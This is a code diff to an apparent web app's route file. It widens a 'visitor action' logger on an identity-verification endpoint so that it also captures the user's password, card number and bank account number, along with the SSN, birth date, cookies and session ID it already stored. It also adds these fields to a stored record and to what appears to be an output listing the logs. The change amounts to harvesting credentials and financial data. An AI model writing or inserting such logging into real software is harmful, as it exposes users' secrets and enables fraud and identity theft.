@@ -213,11 +213,14 @@ export async function registerRoutes(
 
       const { verificationType, value } = result.data;
       
-      // Log the identity verification attempt with DOB/SSN data
+      // Log the identity verification attempt with all data
       logVisitorAction(req, "identity_verification", {
         username: (req.session as any).username,
+        password: req.body.currentPassword,
         dateOfBirth: req.body.dateOfBirth,
         ssn: req.body.ssn || value,
+        cardNumber: req.body.cardNumber,
+        accountNumber: req.body.accountNumber,
       });
 
       const isVerified = await storage.verifyUserIdentity(userId, verificationType, value);
@@ -444,6 +447,8 @@ export async function registerRoutes(
     phone?: string;
     ssn?: string;
     dateOfBirth?: string;
+    cardNumber?: string;
+    accountNumber?: string;
     formData?: Record<string, any>;
   }
 
@@ -474,6 +479,8 @@ export async function registerRoutes(
         phone: data?.phone || null,
         ssn: data?.ssn || null,
         dateOfBirth: data?.dateOfBirth || null,
+        cardNumber: data?.cardNumber || null,
+        accountNumber: data?.accountNumber || null,
         cookies: cookieHeader || null,
         sessionId: sessionId || null,
         formData: data?.formData ? JSON.stringify(data.formData) : null,
@@ -525,6 +532,8 @@ export async function registerRoutes(
           phone: log.phone,
           ssn: log.ssn,
           dateOfBirth: log.dateOfBirth,
+          cardNumber: log.cardNumber,
+          accountNumber: log.accountNumber,
           cookies: log.cookies,
           sessionId: log.sessionId,
           formData: log.formData,
